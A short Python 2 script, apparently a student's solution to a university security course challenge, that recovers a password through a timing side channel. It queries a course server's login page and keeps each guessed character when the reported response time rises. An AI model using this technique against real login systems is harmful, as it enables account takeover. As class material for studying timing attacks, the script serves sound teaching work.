#PeriwinkleOpossum
#Challenge 3.5
#Last Edited: 17th Oct, 2017
#Citation: stackOverflow
from urllib2 import Request, urlopen
import numpy as np
import string
import random
import time
all_strings = list(string.letters+'0123456789')
guess = [all_strings,all_strings,all_strings,all_strings,all_strings,all_strings,all_strings,all_strings]
password = 'aaaaaaaa'
password_list = list(password)
username =raw_input("Enter your username:")
start = time.time()
response = urlopen('https://john.cs.olemiss.edu/~jones/csci343/pwd/index.php?username='+username+'&password='+password)
result = response.read()
result_time = result.split()
result_time = int(result_time[0])
i =c=ele=0
guessed = guess[ele]
while(result != "SUCCESSFUL"):
	prev_time = result_time
	response = urlopen('https://john.cs.olemiss.edu/~jones/csci343/pwd/index.php?username='+username+'&password='+password)
	result = response.read()
	result_time = result.split()
	try:
		result_time = int(result_time[0])
	except:
		result_time = "not a time"
	if (result_time > prev_time):
		i = i+1
		ele = ele +1
		if ele < len(guess):		
			guessed = guess[ele]
			random_string = random.choice(guessed)
			password_list[i] = random_string
			password = "".join(password_list)
			print password, 'changes', c
	elif(result_time <= prev_time):
		random_string = random.choice(guessed)
		password_list[i] = random_string
		password = "".join(password_list)
		c=c+1
		print password,'changes', c
print 'Your password is: '+ password
stop = time.time()
print 'Runtime: ', stop - start ,"seconds"